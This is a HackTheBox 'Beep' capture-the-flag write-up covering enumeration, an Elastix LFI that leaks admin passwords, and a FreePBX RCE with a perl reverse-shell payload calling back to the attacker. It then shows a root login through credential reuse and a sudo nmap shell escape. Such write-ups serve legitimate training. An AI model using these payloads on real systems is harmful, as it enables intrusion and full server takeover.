---
Category:
  - B2R
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [Elastix, FreePBX, GTFObins, LFI, RCE, credentials-reuse, privesc/nmap, voip, Linux]
---
# Resolution summary

>[!summary]
>- Deeper enumeration of web portals lead to both a **LFI** and **RCE** on **Elastix**
>- **LFI** allows to **retrieve admin credentials** which can be used to login as root
>- Asterisk user has sudo privileges over nmap. **Nmap** can be abused in order to **spawn a root shell**

## Improved skills

- Deep enumeration
- Exploitation of known vulnerabilities
- Exploitation of GTFObin
- Fixing existing exploits

## Used tools

- nmap
- gobuster
- searchsploit
- public exploits
- svwar

---

# Information Gathering

Scanned all TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Beep]
└─$ sudo nmap 10.10.10.7 -p- -sS -oN scans/all-tcp-ports.txt -v -Pn
...
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
877/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt
...
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Beep]
└─$ sudo nmap -p22,25,80,110,111,143,443,877,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7 -sV -sC -oN scans/open-ports.txt
[sudo] password for kali:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 05:40 EDT
Nmap scan report for 10.10.10.7
Host is up (0.058s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: TOP RESP-CODES APOP STLS LOGIN-DELAY(0) USER AUTH-RESP-CODE PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) EXPIRE(NEVER) UIDL
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            874/udp   status
|_  100024  1            877/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: CONDSTORE SORT=MODSEQ LISTEXT OK UNSELECT NAMESPACE THREAD=ORDEREDSUBJECT SORT ATOMIC RIGHTS=kxte IMAP4 BINARY X-NETSCAPE ACL LIST-SUBSCRIBED IDLE RENAME Completed CATENATE ANNOTATEMORE NO UIDPLUS THREAD=REFERENCES IMAP4rev1 CHILDREN QUOTA MAILBOX-REFERRALS ID MULTIAPPEND URLAUTHA0001 LITERAL+ STARTTLS
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2021-04-27T09:50:56+00:00; +6m43s from scanner time.
877/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 6m42s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 387.04 seconds
```

# Enumeration

## Port 80 - HTTP (Elastix)

- PHP/5.1.6
- Apache/2.2.3 (CentOS)

Enumerated port 80 using a web browser:

![Pasted image 20210427110818.png](../../zzz_res/attachments/Pasted_image_20210427110818.png)

Enumerated web files and directories:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Beep]
└─$ gobuster dir -u https://10.10.10.7 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/p443-directories.txt -k
...
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/]
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/]
/vtigercrm            (Status: 301) [Size: 313] [--> https://10.10.10.7/vtigercrm/]
...

┌──(kali㉿kali)-[~/CTFs/HTB/box/Beep]
└─$ gobuster dir -u https://10.10.10.7 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -o scans/p443-files.txt -k
...
/register.php         (Status: 200) [Size: 1785]
/index.php            (Status: 200) [Size: 1785]
/config.php           (Status: 200) [Size: 1785]
/favicon.ico          (Status: 200) [Size: 894]
/.htaccess            (Status: 403) [Size: 287]
/robots.txt           (Status: 200) [Size: 28]
...
```

Enumerated known exploit for Elastix:

![Pasted image 20210427114740.png](../../zzz_res/attachments/Pasted_image_20210427114740.png)

- LFI —> vulnerable!
- RCE —> after fuzzing, vulnerable!

### ****FreePBX 2.8.1.4****

Enumerated */admin* page and discovered FreePBX 2.8.1.4:

![Pasted image 20210427155257.png](../../zzz_res/attachments/Pasted_image_20210427155257.png)

![Pasted image 20210427155559.png](../../zzz_res/attachments/Pasted_image_20210427155559.png)

Enumerated known exploits for FreePBX 2.8.1.4:

![Pasted image 20210427155921.png](../../zzz_res/attachments/Pasted_image_20210427155921.png)

## Port 3306 - MySQL

• ERROR 1130 (HY000): Host '10.10.14.24' is not allowed to connect to this MySQL server****

## Port 10000 - MiniServ 1.570 (Webmin httpd)

Enumerated port 10000 using a web browser:

![Pasted image 20210427110935.png](../../zzz_res/attachments/Pasted_image_20210427110935.png)

Enumerated known exploit for Webmin:

![Pasted image 20210427115735.png](../../zzz_res/attachments/Pasted_image_20210427115735.png)

Enumerated vulnerabilities with nmap:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Beep]
└─$ nmap -vv --reason -Pn -sV -p 10000 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" 10.10.10.7
...
PORT      STATE SERVICE REASON  VERSION
10000/tcp open  http    syn-ack MiniServ 1.570 (Webmin httpd)
...
| http-vuln-cve2006-3392:
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|
|     Disclosure date: 2006-06-29
|     References:
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|       http://www.exploit-db.com/exploits/1997/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
...
```

# Exploitation

## Elastix 2.2.0 - 'graph.php' Local File Inclusion (#1)

Poc: [Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/37637)

Verified if the website is vulnerable: [https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action](https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action)

Extracted admin credentials from the .conf file:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Beep/exploit]
└─$ curl 'https://10.10.10.7//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action' --insecure -s -i | tee | grep -v '\#' | awk NF
HTTP/1.1 200 OK
Date: Tue, 27 Apr 2021 14:21:46 GMT
Server: Apache/2.2.3 (CentOS)
X-Powered-By: PHP/5.1.6
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

AMPDBHOST=localhost
AMPDBENGINE=mysql
AMPDBUSER=asteriskuser
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
AMPMGRPASS=jEhdIekWmdjE
AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin
AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin 
FOPWEBROOT=/var/www/html/panel
FOPPASSWORD=jEhdIekWmdjE
ARI_ADMIN_USERNAME=admin
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
AUTHTYPE=database
AMPADMINLOGO=logo.png
AMPEXTENSIONS=extensions
ENABLECW=no
ZAP2DAHDICOMPAT=true
MOHDIR=mohmp3
AMPMODULEXML=http://mirror.freepbx.org/
AMPMODULESVN=http://mirror.freepbx.org/modules/
AMPDBNAME=asterisk
ASTETCDIR=/etc/asterisk
ASTMODDIR=/usr/lib/asterisk/modules
ASTVARLIBDIR=/var/lib/asterisk
ASTAGIDIR=/var/lib/asterisk/agi-bin
ASTSPOOLDIR=/var/spool/asterisk
ASTRUNDIR=/var/run/asterisk
ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
```

>[!warning]
>LFI can also lead to RCE due to the fact that it is possible to send email using the open Postfix server. Injecting a webshell inside the body of an email and sending it to an existing user it is possible to exploit the LFI to force the application to open /var/mail/\<user\> and execute the injected code

Logged in FreePBX using admin credentials:

![Pasted image 20210427161831.png](../../zzz_res/attachments/Pasted_image_20210427161831.png)

Logged in Elastix using admin credentials:

![Pasted image 20210427162622.png](../../zzz_res/attachments/Pasted_image_20210427162622.png)

Enumerated all the software versions:

![Pasted image 20210427162924.png](../../zzz_res/attachments/Pasted_image_20210427162924.png)

Enumerated the web portal:

![Pasted image 20210427163642.png](../../zzz_res/attachments/Pasted_image_20210427163642.png)

## FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution (#2)

PoC already fixed from SSL errors: [18650-fixed.py](https://gist.githubusercontent.com/thel3l/a78c08272781130317d0bc73d1881d28/raw/4b5694a7486f827072662e4a3555625d43d3689c/18650-fixed.py)

Fixed the exploit setting the right parameters and added a print function:

```python
...
rhost="10.10.10.7"
lhost="10.10.14.24"
lport=5505
extension="1000"
...
url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
print url
urllib2.urlopen(url, context=ctx)
```

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Beep/exploit]
└─$ python 18650-fixed.py 
https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.24%3a5505%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A

┌──(kali㉿kali)-[~/…/HTB/box/Beep/exploit]
└─$ nc -nlvp 5505        
listening on [any] 5505 ...
```

Exploit did not work, investigating the server response it told that a different extension parameter was necessary:

![Pasted image 20210427181739.png](../../zzz_res/attachments/Pasted_image_20210427181739.png)

While the full explanation can be found here ([https://hakin9.org/voip-hacking-techniques/](https://hakin9.org/voip-hacking-techniques/)) after some enumeration it appears that the right number was 233:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Beep/exploit]
└─$ svwar -m INVITE -e100-500 10.10.10.7
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 233       | reqauth        |
+-----------+----------------+
```

Fixed the exploit, a reverse shell is obtained:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Beep/exploit]
└─$ python 18650-fixed.py
https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.24%3a5505%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A

┌──(kali㉿kali)-[~/…/HTB/box/Beep/exploit]
└─$ nc -nlvp 5505        
listening on [any] 5505 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.7] 35833
whoami
asterisk
```

# Privilege Escalation

## Root login due to credentials reuse (#1)

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Beep/exploit]
└─$ ssh root@10.10.10.7 -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
root@10.10.10.7's password: 
Last login: Tue Apr 27 17:42:23 2021 from 10.10.14.24

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# whoami && hostname && cat /home/fanis/user.txt && cat /root/root.txt && ifconfig -a
root
beep
4b4455d3b590c2f6505a8aa3ebc460a9
97c50cb86a99c086e8bec4720e0c423d
eth0      Link encap:Ethernet  HWaddr 00:50:56:B9:0C:8C  
          inet addr:10.10.10.7  Bcast:10.10.10.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1452131 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1191514 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:160893887 (153.4 MiB)  TX bytes:297989614 (284.1 MiB)
          Interrupt:59 Base address:0x2024 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:12268 errors:0 dropped:0 overruns:0 frame:0
          TX packets:12268 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1112432 (1.0 MiB)  TX bytes:1112432 (1.0 MiB)
```

![Pasted image 20210427163926.png](../../zzz_res/attachments/Pasted_image_20210427163926.png)

## sudo nmap privilege escalation (#2)

A PTY shell was spawned and sudo permission over nmap was abused in order to spawn a root shell:

PoC: [nmap | GTFOBins](https://gtfobins.github.io/gtfobins/nmap/)

```bash
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")';
bash-3.2$ sudo -l
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

# Trophy

>[!quote]
>Never underestimate the determination of a kid who is time-rich and cash-poor.
>
>\- Cory Doctorow

>[!success]
>**User.txt**
>4b4455d3b590c2f6505a8aa3ebc460a9

>[!success]
>**Root.txt**
>97c50cb86a99c086e8bec4720e0c423d

